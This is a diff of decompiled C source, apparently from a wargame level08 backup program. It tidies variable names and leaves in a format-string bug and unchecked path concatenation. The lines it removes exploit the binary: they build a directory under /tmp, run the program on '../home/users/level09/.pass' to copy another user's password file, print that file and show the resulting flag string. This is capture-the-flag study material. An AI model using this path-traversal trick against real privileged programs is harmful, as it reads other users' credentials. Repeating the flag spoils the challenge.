@@ -4,7 +4,7 @@ void log_wrapper(FILE *logfile, char *log, char *filename)
 {
     char buf[256];
    
-    strcpy(buf, arg2);
+    strcpy(buf, log);
     snprintf(buf, 254 - strlen(buf), filename);
 
     buf[strcspn(buf, "\n")] = 0;
@@ -17,13 +17,11 @@ void log_wrapper(FILE *logfile, char *log, char *filename)
 
 int main (int argc, char **argv)
 {
-    int32_t filebak;
-    FILE *logfile;
-    int64_t file;
-    char **filename;
-
-    char ptr;
-    char filename[110] = "./backups";
+    FILE    *logfile;
+    int     file;
+    int     filebak;
+    char    filename[110] = "./backups/";
+    char    c;
 
     if (argc != 2)
         printf("Usage: %s filename\n", *argv);
@@ -44,7 +42,7 @@ int main (int argc, char **argv)
         exit(1);
     }
 
-    strncat(filename, argv[1], 99 - strlen(ptr + 1));
+    strncat(filename, argv[1], 99 - strlen(argv[1]));
     filebak = open(filename, 0xc1, 0x1b0);
 
     if (filebak <= -1) {
@@ -52,10 +50,10 @@ int main (int argc, char **argv)
         exit(1);
     }
 
-    ptr = fgetc(file);
-    while (ptr != -1) {
-        write(filebak, &ptr, 1);
-        ptr = fgetc(file);
+    c = fgetc(file);
+    while (c != -1) {
+        write(filebak, &c, 1);
+        c = fgetc(file);
     }
 
     log_wrapper(logfile, "Finished back up ", argv[1]);
@@ -65,10 +63,3 @@ int main (int argc, char **argv)
 
     return 0;
 }
-
-
-cd /tmp
-mkdir -p backups home/users/level09
-/home/users/level08/level08 ../home/users/level09/.pass
-cat home/users/level09/.pass
-fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
